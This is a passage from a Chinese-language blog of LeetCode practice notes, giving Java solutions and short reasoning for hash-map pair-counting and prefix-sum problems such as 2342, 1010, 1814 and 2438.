<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2342-数位和相等数对的最大和"><a href="#2342-数位和相等数对的最大和" class="headerlink" title="2342. 数位和相等数对的最大和"></a><a href="https://leetcode.cn/problems/max-sum-of-a-pair-with-equal-sum-of-digits/">2342. 数位和相等数对的最大和</a></h3><p>跟2815很像，不知道为啥是中等题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">digitSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">tempNum</span> <span class="operator">=</span> num; tempNum &gt; <span class="number">0</span>; tempNum /= <span class="number">10</span>) &#123;</span><br><span class="line">                digitSum += tempNum % <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">anotherVal</span> <span class="operator">=</span> map.getOrDefault(digitSum, Integer.MIN_VALUE);</span><br><span class="line">            res = Integer.max(res, anotherVal + num);</span><br><span class="line">            <span class="keyword">if</span>(num &gt; anotherVal)&#123;</span><br><span class="line">                map.put(digitSum, num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1679-K-和数对的最大数目"><a href="#1679-K-和数对的最大数目" class="headerlink" title="1679. K 和数对的最大数目"></a><a href="https://leetcode.cn/problems/max-number-of-k-sum-pairs/">1679. K 和数对的最大数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直观感觉应该算是简单题，因为其实移除不用考虑顺序，a只跟k-a有关。不会互相影响</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxOperations(int[] nums, int k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = new HashMap();</span><br><span class="line">        int res = 0;</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            if (map.getOrDefault(k - num, 0) &gt; 0) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                map.put(k - num, map.get(k - num) - 1);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                map.put(num, map.getOrDefault(num, 0) + 1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1010-总持续时间可被-60-整除的歌曲"><a href="#1010-总持续时间可被-60-整除的歌曲" class="headerlink" title="1010. 总持续时间可被 60 整除的歌曲"></a><a href="https://leetcode.cn/problems/pairs-of-songs-with-total-durations-divisible-by-60/">1010. 总持续时间可被 60 整除的歌曲</a></h3><p>跟1679，差不多，模下就行。不过可以直接使用桶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numPairsDivisibleBy60</span><span class="params">(<span class="type">int</span>[] time)</span> &#123;</span><br><span class="line">        System.out.println(time.length);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[MOD_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> singleTime : time) &#123;</span><br><span class="line">            bucket[singleTime % MOD_NUM]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        res += (<span class="type">long</span>) bucket[<span class="number">0</span>] * (bucket[<span class="number">0</span>] - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        res += (<span class="type">long</span>) bucket[<span class="number">30</span>] * (bucket[<span class="number">30</span>] - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            res += (<span class="type">long</span>) bucket[i] * bucket[MOD_NUM - i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3185-构成整天的下标对数目-II"><a href="#3185-构成整天的下标对数目-II" class="headerlink" title="3185. 构成整天的下标对数目 II"></a><a href="https://leetcode.cn/problems/count-pairs-that-form-a-complete-day-ii/">3185. 构成整天的下标对数目 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countCompleteDayPairs</span><span class="params">(<span class="type">int</span>[] hours)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> <span class="number">24</span>;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[MOD_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> hour :  hours) &#123;</span><br><span class="line">            bucket[hour % MOD_NUM]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        res += (<span class="type">long</span>) bucket[<span class="number">0</span>] * (bucket[<span class="number">0</span>] - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        res += (<span class="type">long</span>) bucket[MOD_NUM / <span class="number">2</span>] * (bucket[MOD_NUM / <span class="number">2</span>] - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; MOD_NUM/<span class="number">2</span>; i++) &#123;</span><br><span class="line">            res += (<span class="type">long</span>) bucket[i] * bucket[MOD_NUM - i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2971-找到最大周长的多边形"><a href="#2971-找到最大周长的多边形" class="headerlink" title="2971. 找到最大周长的多边形"></a><a href="https://leetcode.cn/problems/find-polygon-with-the-largest-perimeter/">2971. 找到最大周长的多边形</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直观感觉先排序。</span><br><span class="line">有两种可能</span><br><span class="line">一种是dp做法（猜测）</span><br><span class="line">另外一种是贪心+前缀和做法（猜测）</span><br><span class="line">继续分析</span><br><span class="line">就是贪心，从右到左遍历即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public long largestPerimeter(int[] nums) &#123;</span><br><span class="line">        System.out.println(nums.length);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        int n = nums.length;</span><br><span class="line">        long sumVal = Arrays.stream(nums).asLongStream().sum();</span><br><span class="line">        for (int i = n - 1; i &gt;= 2; i--) &#123;</span><br><span class="line">            sumVal -= nums[i];</span><br><span class="line">            if(nums[i] &lt; sumVal) return nums[i] + sumVal;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2748-美丽下标对的数目"><a href="#2748-美丽下标对的数目" class="headerlink" title="2748. 美丽下标对的数目"></a><a href="https://leetcode.cn/problems/number-of-beautiful-pairs/">2748. 美丽下标对的数目</a></h3><p>简单题，直接贴代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countBeautifulPairs</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="comment">//其实可以打表记录互斥，懒得打表简单题</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">lastNum</span> <span class="operator">=</span> num % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (lastNum == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> num;</span><br><span class="line">            <span class="keyword">for</span> (; x &gt;= <span class="number">10</span>; x /= <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">firstNum</span> <span class="operator">=</span> x;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (gcd(i, lastNum) == <span class="number">1</span>) res += bucket[i];</span><br><span class="line">            &#125;</span><br><span class="line">            bucket[firstNum]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a % b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2874-有序三元组中的最大值-II"><a href="#2874-有序三元组中的最大值-II" class="headerlink" title="2874. 有序三元组中的最大值 II"></a><a href="https://leetcode.cn/problems/maximum-value-of-an-ordered-triplet-ii/">2874. 有序三元组中的最大值 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录前面位置的差值最大值，然后相乘更新</span><br><span class="line">（感觉简单难度）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public long maximumTripletValue(int[] nums) &#123;</span><br><span class="line">        int preMaxVal = nums[0];</span><br><span class="line">        int preMaxSubVal = nums[0] - nums[1];</span><br><span class="line">        if (preMaxVal &lt; nums[1]) preMaxVal = nums[1];</span><br><span class="line">        long res = 0;</span><br><span class="line">        for (int i = 2; i &lt; nums.length; i++) &#123;</span><br><span class="line">            //更新结果</span><br><span class="line">            res = Long.max(res, (long) nums[i] * preMaxSubVal);</span><br><span class="line">            //更新最大差值</span><br><span class="line">            preMaxSubVal = Integer.max(preMaxSubVal, preMaxVal - nums[i]);</span><br><span class="line">            //更新前面最大值</span><br><span class="line">            if(nums[i] &gt; preMaxVal) preMaxVal = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1014-最佳观光组合"><a href="#1014-最佳观光组合" class="headerlink" title="1014. 最佳观光组合"></a><a href="https://leetcode.cn/problems/best-sightseeing-pair/">1014. 最佳观光组合</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是多了个距离惩罚，遍历的时候减下之前最大值在比就行</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxScoreSightseeingPair(int[] values) &#123;</span><br><span class="line">        int res = 0;</span><br><span class="line">        int maxValWithDistanceLoss = values[0];</span><br><span class="line">        for (int i = 1; i &lt; values.length; i++) &#123;</span><br><span class="line">            maxValWithDistanceLoss--;</span><br><span class="line">            res = Integer.max(res, values[i] + maxValWithDistanceLoss);</span><br><span class="line">            maxValWithDistanceLoss = Integer.max(maxValWithDistanceLoss, values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单难度吧</p>
<h3 id="1814-统计一个数组中好对子的数目"><a href="#1814-统计一个数组中好对子的数目" class="headerlink" title="1814. 统计一个数组中好对子的数目"></a><a href="https://leetcode.cn/problems/count-nice-pairs-in-an-array/">1814. 统计一个数组中好对子的数目</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个数组 nums ，数组中只包含非负整数。定义 rev(x) 的值为将整数 x 各个数字位反转得到的结果。比方说 rev(123) = 321 ， rev(120) = 21 。我们称满足下面条件的下标对 (i, j) 是 好的 ：</span><br><span class="line"></span><br><span class="line">0 &lt;= i &lt; j &lt; nums.length</span><br><span class="line">nums[i] + rev(nums[j]) == nums[j] + rev(nums[i])</span><br><span class="line">请你返回好下标对的数目。由于结果可能会很大，请将结果对 109 + 7 取余 后返回。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">纸老虎。</span><br><span class="line">比如42、97能配对的本质是42-24=18、97-79=18.就能配对了</span><br><span class="line">新建个hashMap就行了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNicePairs</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">revNum</span> <span class="operator">=</span> rev(num);</span><br><span class="line">            <span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> num - revNum;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> map.getOrDefault(dis, <span class="number">0</span>);</span><br><span class="line">            res += count;</span><br><span class="line">            res %= MOD_NUM;</span><br><span class="line">            map.put(dis, count + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rev</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="comment">//题目没说以零结尾的反转怎样</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            retVal = retVal * <span class="number">10</span> + num % <span class="number">10</span>;</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="2559-统计范围内的元音字符串数"><a href="#2559-统计范围内的元音字符串数" class="headerlink" title="2559. 统计范围内的元音字符串数"></a><a href="https://leetcode.cn/problems/count-vowel-strings-in-ranges/">2559. 统计范围内的元音字符串数</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] vowelStrings(String[] words, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>));</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> words.length;</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; words.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set.contains(words[i].charAt(<span class="number">0</span>)) &amp;&amp; set.contains(words[i].charAt(words[i].length() - <span class="number">1</span>)))&#123;</span><br><span class="line">                preSum[i+<span class="number">1</span>] = preSum[i] +<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                preSum[i+<span class="number">1</span>] = preSum[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> [] res = <span class="keyword">new</span> <span class="title class_">int</span>[queries.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            res[i] = preSum[right + <span class="number">1</span>] - preSum[left];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前缀和裸题</p>
<h3 id="2389-和有限的最长子序列"><a href="#2389-和有限的最长子序列" class="headerlink" title="2389. 和有限的最长子序列"></a><a href="https://leetcode.cn/problems/longest-subsequence-with-limited-sum/">2389. 和有限的最长子序列</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] answerQueries(<span class="type">int</span>[] nums, <span class="type">int</span>[] queries) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            preSum[i + <span class="number">1</span>] = preSum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">int</span>[] resArr = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="comment">//preSum[k]&lt;= Cur &lt; preSum[k+1]</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n;</span><br><span class="line">            <span class="keyword">if</span>(queries[i] &lt; preSum[<span class="number">1</span>]) resArr[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (queries[i] &gt; preSum[right]) &#123;</span><br><span class="line">                resArr[i] = right;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left + <span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//left&lt;mid&lt;=right</span></span><br><span class="line">                    <span class="keyword">if</span>(preSum[mid] &lt;= queries[i])&#123;</span><br><span class="line">                        left = mid;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        right = mid - <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                resArr[i] = left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resArr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>排序 + 前缀和 + 二分 。感觉应该是mid难度</p>
<h3 id="3152-特殊数组-II"><a href="#3152-特殊数组-II" class="headerlink" title="3152. 特殊数组 II"></a><a href="https://leetcode.cn/problems/special-array-ii/">3152. 特殊数组 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这种题面加有query的一看就是前缀和题。</span><br><span class="line">但是这道题有点特殊，想想怎样定义前缀和数组 </span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] isArraySpecial(<span class="type">int</span>[] nums, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] % <span class="number">2</span> != nums[i - <span class="number">1</span>] % <span class="number">2</span>) &#123;</span><br><span class="line">                preSum[i] = preSum[i - <span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preSum[i] = preSum[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">boolean</span>[] resArr = <span class="keyword">new</span> <span class="title class_">boolean</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(preSum[right] - preSum[left] == <span class="number">0</span>) resArr[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> resArr[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resArr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2438-二的幂数组中查询范围内的乘积"><a href="#2438-二的幂数组中查询范围内的乘积" class="headerlink" title="2438. 二的幂数组中查询范围内的乘积"></a><a href="https://leetcode.cn/problems/range-product-queries-of-powers/">2438. 二的幂数组中查询范围内的乘积</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和（乘），但需要求逆元，学了忘完了，https://blog.csdn.net/qq_43652327/article/details/113106972</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] productQueries(<span class="type">int</span> n, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">base</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % <span class="number">2</span> != <span class="number">0</span>) list.add(base);</span><br><span class="line">            base *= <span class="number">2</span>;</span><br><span class="line">            n /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">listSize</span> <span class="operator">=</span> list.size();</span><br><span class="line">        <span class="type">int</span>[] preMul = <span class="keyword">new</span> <span class="title class_">int</span>[listSize + <span class="number">1</span>];</span><br><span class="line">        preMul[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            preMul[i + <span class="number">1</span>] = (<span class="type">int</span>) (((<span class="type">long</span>) preMul[i]) * list.get(i) % MOD_NUM);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] retArray = <span class="keyword">new</span> <span class="title class_">int</span>[queries.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="comment">// targetVal * preMul[left] % MOD_NUM = preMul[right + 1];</span></span><br><span class="line">            <span class="comment">//计算preMul[left] 的逆元，即preMul[left] **（MOD_NUM-2)</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">mulTime</span> <span class="operator">=</span> MOD_NUM - <span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">baseNum</span> <span class="operator">=</span> preMul[left];</span><br><span class="line">            <span class="type">long</span> <span class="variable">revNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (mulTime != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((mulTime &amp; <span class="number">1</span>) == <span class="number">1</span>) revNum = revNum * baseNum % MOD_NUM;</span><br><span class="line">                mulTime &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                baseNum = baseNum * baseNum % MOD_NUM;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">targetVal</span> <span class="operator">=</span> (<span class="type">int</span>) (revNum * preMul[right + <span class="number">1</span>] % MOD_NUM);</span><br><span class="line">            retArray[i] = targetVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前缀和 + 快速幂 + 位运算 。感觉应该算是简单hard难度</p>
<h3 id="2055-蜡烛之间的盘子"><a href="#2055-蜡烛之间的盘子" class="headerlink" title="2055. 蜡烛之间的盘子"></a><a href="https://leetcode.cn/problems/plates-between-candles/">2055. 蜡烛之间的盘子</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前缀和变式。</span><br><span class="line">想想怎样定义，想不出来了。看题解</span><br><span class="line"></span><br><span class="line">看题解后复盘：之前以为前缀和就能完全解决，但其实还需要其它操作，要学会灵活</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/plates-between-candles/solutions/1319516/gong-shui-san-xie-er-fen-qian-zhui-he-yu-0qt0/">2055. 蜡烛之间的盘子 - 力扣（LeetCode）</a></p>
<p>之后学学题解</p>
<p>代码</p>
